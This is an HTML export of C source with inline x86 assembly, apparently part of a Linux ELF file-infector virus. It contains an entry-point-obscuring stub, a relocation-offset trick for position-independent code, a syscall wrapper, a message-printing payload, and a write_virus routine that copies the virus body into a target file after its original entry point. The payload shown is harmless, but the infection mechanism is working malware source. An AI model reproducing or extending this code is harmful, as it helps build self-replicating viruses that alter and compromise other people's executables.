<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">#define SYS_WRITE 4
#define STDOUT 1
</span><span class="sc0">
</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">mesaj</span><span class="sc10">[];</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">call_syscall</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">,...);</span><span class="sc0">

</span><span class="sc1">/* void start_virus() {} */</span><span class="sc0">
</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">virus_code</span><span class="sc10">[]</span><span class="sc0">
</span><span class="sc11">__attribute__</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc0"> </span><span class="sc11">aligned</span><span class="sc10">(</span><span class="sc4">8</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">section</span><span class="sc10">(</span><span class="sc6">".text"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc4">0x68</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc0">      </span><span class="sc1">/* 08048080: push dword 0x0         */</span><span class="sc0">
  </span><span class="sc4">0x9C</span><span class="sc10">,</span><span class="sc0">                          </span><span class="sc1">/* 08048085: pushf                  */</span><span class="sc0">
  </span><span class="sc4">0x60</span><span class="sc10">,</span><span class="sc0">                          </span><span class="sc1">/* 08048086: pusha                  */</span><span class="sc0">
  </span><span class="sc4">0xE8</span><span class="sc10">,</span><span class="sc4">0x04</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc0">      </span><span class="sc1">/* 08048087: call 0x8048090         */</span><span class="sc0">
  </span><span class="sc4">0x61</span><span class="sc10">,</span><span class="sc0">                          </span><span class="sc1">/* 0804808C: popa                   */</span><span class="sc0">
  </span><span class="sc4">0x9D</span><span class="sc10">,</span><span class="sc0">                          </span><span class="sc1">/* 0804808D: popf                   */</span><span class="sc0">
  </span><span class="sc4">0xC3</span><span class="sc10">,</span><span class="sc0">                          </span><span class="sc1">/* 0804808E: ret                    */</span><span class="sc0">
  </span><span class="sc4">0x90</span><span class="sc0">                           </span><span class="sc1">/* 0804808F: nop                    */</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0"> </span><span class="sc1">/* 16 bytes (0x10) */</span><span class="sc0">

</span><span class="sc1">/* here comes the virus body which is in virus_code the procedure : call 0x8048090 
 * the virus body simply calls the sysfunction sys.write to print out our dear
 * string ( mesaj ) 
*/</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">virus_body</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">=</span><span class="sc11">get_relocate_offset</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">msg</span><span class="sc10">=</span><span class="sc11">offset</span><span class="sc10">+</span><span class="sc11">mesaj</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">call_syscall</span><span class="sc10">(</span><span class="sc11">SYS_WRITE</span><span class="sc10">,</span><span class="sc11">STDOUT</span><span class="sc10">,</span><span class="sc11">msg</span><span class="sc10">,</span><span class="sc4">35</span><span class="sc10">);</span><span class="sc0">       </span><span class="sc1">/* payload ;) */</span><span class="sc0">
    
                                    </span><span class="sc1">/* 35 = strlen(msg) ...but the implementation
                     * : strlen(msg) didnt work so i had to do that 
                     * per hand ;( .maybe you could improve that ...*/</span><span class="sc0">
    
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* here we'll compare the actual value of IP ( Instruction Pointer ) which the location
 * of "test_me" which the compiler had in mind when it build the executable.
 * at the end result should be 0
*/</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">get_relocate_offset</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">__asm__</span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc6">"call test_me;"</span><span class="sc0">
        </span><span class="sc6">"test_me:     "</span><span class="sc0">
        </span><span class="sc6">"pop %%eax   ;"</span><span class="sc0">
        </span><span class="sc6">"sub $(test_me),%%eax;"</span><span class="sc0">
        </span><span class="sc10">:</span><span class="sc6">"=a"</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">result</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* this a simple version of syscall ...
 * after all we'll use this function only for printing out our string
 * so we dont care about the error messaged which might have occured
 * during the execution.
*/</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">call_syscall</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nr</span><span class="sc10">,...)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">register</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc10">;</span><span class="sc0">    </span><span class="sc1">/* return value */</span><span class="sc0">
    </span><span class="sc16">asm</span><span class="sc10">(</span><span class="sc6">"push %ebx; push %esi; push %edi"</span><span class="sc10">);</span><span class="sc0">     </span><span class="sc1">/* save all registers... */</span><span class="sc0">
    
    </span><span class="sc1">/* well we'll use this function only the syscall sys_write...
         * so here are the description of the commands... */</span><span class="sc0">
    
    </span><span class="sc16">asm</span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc6">"mov 28(%%ebp),%%edi;"</span><span class="sc0">
        </span><span class="sc6">"mov 24(%%ebp),%%esi;"</span><span class="sc0">
        </span><span class="sc6">"mov 20(%%ebp),%%edx;"</span><span class="sc0">    </span><span class="sc1">/* move size of data to write to edx */</span><span class="sc0">
        </span><span class="sc6">"mov 16(%%ebp),%%ecx;"</span><span class="sc0">    </span><span class="sc1">/* move address of data ecx */</span><span class="sc0">
        </span><span class="sc6">"mov 12(%%ebp),%%ebx;"</span><span class="sc0">    </span><span class="sc1">/* move file descriptor(where to write data) to ebx */</span><span class="sc0"> 
        </span><span class="sc6">"mov 8(%%ebp),%%eax;"</span><span class="sc0">     </span><span class="sc1">/* move syscall number defined is /usr/include/asm/unistd.h to eax */</span><span class="sc0">
        </span><span class="sc6">"int $0x80"</span><span class="sc0">
        </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc6">"=a"</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">result</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc16">asm</span><span class="sc10">(</span><span class="sc6">"pop %edi; pop %esi; pop %ebx"</span><span class="sc10">);</span><span class="sc0">      </span><span class="sc1">/* restore saved registers */</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* our dear string... */</span><span class="sc0">
</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">mesaj</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">__attribute__</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">section</span><span class="sc10">(</span><span class="sc6">".text"</span><span class="sc10">)))=</span><span class="sc6">"::: Caline I Miss You (Cyneox) :::\n"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* end_virus is the address where we stop with copying our virus to file...
 * its a simple implementation how to determinate the end of our virus code...
*/</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">end_virus</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{}</span><span class="sc0">

</span><span class="sc1">/* --------------- write_virus ------------------ */</span><span class="sc0">
</span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">write_virus</span><span class="sc10">(</span><span class="sc11">Infect</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">=</span><span class="sc11">get_relocate_offset</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">virus_begin</span><span class="sc10">=</span><span class="sc11">offset</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">virus_code</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">virus_end</span><span class="sc10">=</span><span class="sc11">offset</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)&amp;</span><span class="sc11">end_virus</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">virus_size</span><span class="sc10">=</span><span class="sc11">virus_end</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">virus_begin</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc1">/* write first byte of char virus_code = "push" */</span><span class="sc0">
    </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">fd_dest</span><span class="sc10">,</span><span class="sc11">virus_begin</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* write our original entry point for EPO */</span><span class="sc0">
    </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">fd_dest</span><span class="sc10">,&amp;</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">origin_entry</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">origin_entry</span><span class="sc10">));</span><span class="sc0">
    
</span><span class="sc9">#ifdef DEBUG_IT
</span><span class="sc0">    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"....:::: [ write_virus ] ::::....\n"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"offset     = %d\n"</span><span class="sc10">,</span><span class="sc11">offset</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"virus_begin= %x\n"</span><span class="sc10">,</span><span class="sc11">virus_begin</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"virus_end  = %x\n"</span><span class="sc10">,</span><span class="sc11">virus_end</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"virus_code = %p\n"</span><span class="sc10">,</span><span class="sc11">virus_code</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"virus_body = %p\n"</span><span class="sc10">,&amp;</span><span class="sc11">virus_body</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"get_relocate_offset = %p\n"</span><span class="sc10">,&amp;</span><span class="sc11">get_relocate_offset</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"call_me    = %p\n"</span><span class="sc10">,&amp;</span><span class="sc11">call_syscall</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"mesaj      = %p\n"</span><span class="sc10">,</span><span class="sc11">mesaj</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"end_virus  = %p\n"</span><span class="sc10">,&amp;</span><span class="sc11">end_virus</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"write_virus= %p\n"</span><span class="sc10">,&amp;</span><span class="sc11">write_virus</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"virus_size = %d\n"</span><span class="sc10">,</span><span class="sc11">virus_size</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">    
    </span><span class="sc1">/* now write the virus code ... */</span><span class="sc0">
    </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">-&gt;</span><span class="sc11">fd_dest</span><span class="sc10">,</span><span class="sc11">virus_begin</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">virus_size</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
    
</span></div></body>
</html>
